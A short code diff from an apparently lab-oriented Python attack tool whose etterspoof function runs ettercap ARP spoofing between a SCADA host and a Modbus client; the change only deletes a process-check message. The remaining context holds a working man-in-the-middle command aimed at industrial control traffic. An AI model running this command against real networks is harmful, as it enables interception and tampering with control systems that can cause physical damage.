@@ -68,12 +68,6 @@ def etterspoof():
         os.system(cmd)
         
         time.sleep(2)
-
-        if subprocess.getoutput("pgrep -x ettercap") != "":
-            print("[+] Ettercap is now running in the background.")
-        else:
-            print("[!] Failed to start Ettercap. Check container permissions.")
-
         
         cmd = ["ettercap", "-TqD", "-i", intrfce, "-M", "arp:remote", f"/{nm_config.scada_ip}//", f"/{nm_config.modcli_ip}//"]
         print(f"Executing: {' '.join(cmd)}")
